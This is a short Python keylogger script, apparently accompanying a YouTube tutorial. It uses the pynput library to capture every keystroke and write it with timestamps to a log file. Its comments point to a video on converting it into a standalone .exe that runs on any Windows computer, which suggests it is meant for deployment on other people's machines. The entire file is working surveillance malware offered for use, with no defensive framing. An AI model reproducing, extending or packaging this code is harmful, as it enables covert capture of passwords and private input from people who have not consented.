#youtube video tutorial (full) :

# WATCH THIS VIDEO FIRST :

# https://youtu.be/fo6RlmFqhQQ



# first install pynput with the command pip install pynput , others are inbuilt

# import the requires modules

# VERSION 1.0.0


import logging
from pynput.keyboard import Key,Listener
import os

# get the path in which the executable is present and create a new folder where the log will be stored
dir = os.getcwd() + "\\log"
if not os.path.exists(dir):
    os.makedirs(dir)

#create the txt file
filecreate=open(dir+"\output.txt","w")
filecreate.close()

# now specify where to save the logs and in what format
logging.basicConfig(filename=(dir+"\output.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
# replace with the path of your output file

# make a function which stores the info in the txt file
def on_press(key):
    logging.info(str(key))

# set the keyboard to always wait for some key to be pressed
with Listener(on_press=on_press) as listener:
    listener.join()


# If you want to convert this .py file to .exe file , that can run on all computers, whether or not they have python installed ,
# check the video given in the starting of this script ....